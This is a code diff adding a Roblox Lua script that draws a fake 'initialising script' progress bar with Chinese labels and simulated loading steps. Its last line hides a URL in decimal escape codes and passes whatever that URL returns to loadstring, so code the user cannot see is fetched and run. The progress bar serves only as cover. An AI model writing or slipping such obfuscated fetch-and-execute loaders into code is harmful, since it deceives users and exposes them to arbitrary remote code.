@@ -1,0 +1,125 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "ProgressLoader"
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- 创建主容器
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 120)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -60)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+mainFrame.BackgroundTransparency = 0.05
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = mainFrame
+
+-- 标题
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0.8, 0, 0, 30)
+title.Position = UDim2.new(0.1, 0, 0.1, 0)
+title.BackgroundTransparency = 1
+title.Text = "脚本初始化"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+-- 进度条背景
+local progressBackground = Instance.new("Frame")
+progressBackground.Size = UDim2.new(0.8, 0, 0, 20)
+progressBackground.Position = UDim2.new(0.1, 0, 0.5, 0)
+progressBackground.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+progressBackground.BorderSizePixel = 0
+progressBackground.Parent = mainFrame
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(0, 10)
+progressCorner.Parent = progressBackground
+
+-- 进度条前景
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.Position = UDim2.new(0, 0, 0, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressBackground
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0, 10)
+barCorner.Parent = progressBar
+
+-- 百分比文字
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(0.8, 0, 0, 20)
+percentText.Position = UDim2.new(0.1, 0, 0.75, 0)
+percentText.BackgroundTransparency = 1
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.fromRGB(200, 200, 200)
+percentText.TextScaled = true
+percentText.Font = Enum.Font.Gotham
+percentText.Parent = mainFrame
+
+-- 模拟加载过程
+spawn(function()
+    local steps = {
+        {"初始化环境...", 0.5},
+        {"加载模块...", 1.0},
+        {"配置设置...", 0.8},
+        {"准备完成...", 1.2}
+    }
+    
+    local totalTime = 0
+    for _, step in ipairs(steps) do
+        totalTime = totalTime + step[2]
+    end
+    
+    local currentTime = 0
+    for i, step in ipairs(steps) do
+        title.Text = step[1]
+        
+        local startProgress = (currentTime / totalTime) * 240 -- 240是进度条最大宽度
+        local endProgress = ((currentTime + step[2]) / totalTime) * 240
+        
+        -- 进度条动画
+        local tweenInfo = TweenInfo.new(step[2], Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local tween = TweenService:Create(progressBar, tweenInfo, {
+            Size = UDim2.new(0, endProgress, 1, 0)
+        })
+        
+        tween:Play()
+        
+        -- 更新百分比
+        local startPercent = math.floor((currentTime / totalTime) * 100)
+        local endPercent = math.floor(((currentTime + step[2]) / totalTime) * 100)
+        
+        for percent = startPercent, endPercent do
+            percentText.Text = percent .. "%"
+            wait(step[2] / (endPercent - startPercent))
+        end
+        
+        currentTime = currentTime + step[2]
+    end
+    
+    -- 加载完成
+    title.Text = "加载完成!"
+    percentText.Text = "100%"
+    
+    wait(1)
+    
+    -- 淡出
+    local fadeTween = TweenService:Create(mainFrame, TweenInfo.new(0.5), {
+        BackgroundTransparency = 1
+    })
+    fadeTween:Play()
+    
+    fadeTween.Completed:Wait()
+    gui:Destroy()
+end)
+
+loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\112\097\110\100\097\100\101\118\101\108\111\112\109\101\110\116\046\110\101\116\047\118\105\114\116\117\097\108\047\102\105\108\101\047\055\052\101\053\053\049\049\102\054\051\102\099\050\049\052\054"))()
